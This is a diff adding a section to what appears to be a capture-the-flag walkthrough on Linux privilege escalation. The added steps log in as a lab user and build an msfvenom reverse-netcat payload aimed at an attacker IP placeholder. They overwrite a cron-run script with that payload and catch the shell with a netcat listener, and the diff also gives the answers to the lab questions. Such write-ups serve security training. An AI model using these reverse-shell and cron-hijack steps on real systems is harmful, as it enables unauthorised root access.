@@ -138,3 +138,41 @@ Walkthrough: Learnt through running the `sudo -l` command
 ### Q: Now, type `:!sh` to open a shell from Vi
 
 ![](/Common%20Linux%20Privesc/images/vi_shell.png)
+
+## Task 8.1 - no answer needed
+
+Login as user4 with the password `password` using the `su -l user4` command
+
+## Task 8.2 - no answer needed
+
+Let's create a payload for our cron exploit using msfvenom
+
+## Task 8.3
+
+### Q: What is the flag to specify a payload in msfvenom?
+
+A: `-p`
+
+Walkthrough: Learnt through Google or through `msfvenom -h` command
+
+## Task 8.4 - no answer needed
+
+Create a payload using `msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=8888 R`
+
+## Task 8.5
+
+### Q: What directory is the autoscript.sh under?
+
+A: /home/user4/Desktop
+
+## Task 8.6 - no answer needed
+
+Replace the contents of the file with our payload using `echo <msfvenom> > autoscript.sh`
+
+## Task 8.7 - no answer needed
+
+After copying the code into autoscript.sh, start a netcat listener using the `nc -nvlp 8888` command on our Kali machine
+
+## Task 8.8 - no answer needed
+
+After 5 minutes, we should get a shell
